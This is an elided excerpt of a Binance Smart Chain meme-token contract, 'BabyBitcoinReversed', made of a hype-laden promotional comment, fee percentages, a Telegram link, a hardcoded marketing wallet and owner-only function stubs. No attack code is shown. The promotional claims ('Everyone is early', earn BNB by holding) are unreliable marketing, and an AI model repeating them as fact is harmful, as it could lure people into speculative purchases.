...
Welcome to the Universe of BabyBitcoinReversed 🌕🐕! Hold and Earn BNB , 
You're not just buying $BBTC but you're also increasing your beans while holding it!
reversed name is one of the bullish right now on bsc space , Everyone is early!  
3% goes to BNB Rewards Pool and 2% for the Liquidity and 2% for the Marketing budget.
All in slippage 7% on every transactions. 


https://t.me/BabyBitcoinReversed
...
*/
    ...
    contract BabyBitcoinReversed  is IBEP20, Ownable
    {
        ...
        string private constant _name = "BabyBitcoinReversed";
        string private constant _symbol = "nioctiBB";
        ...
        address public constant MarketingWallet=0x2eA0783CedD54dd25F2e820146c4641320a606A0; 
        ...
        constructor () {
           ...
           function LiquidityProvider(address account) external onlyOwner {
            ...
            function BmoonBNB(address[] calldata addresses) external onlyOwner {
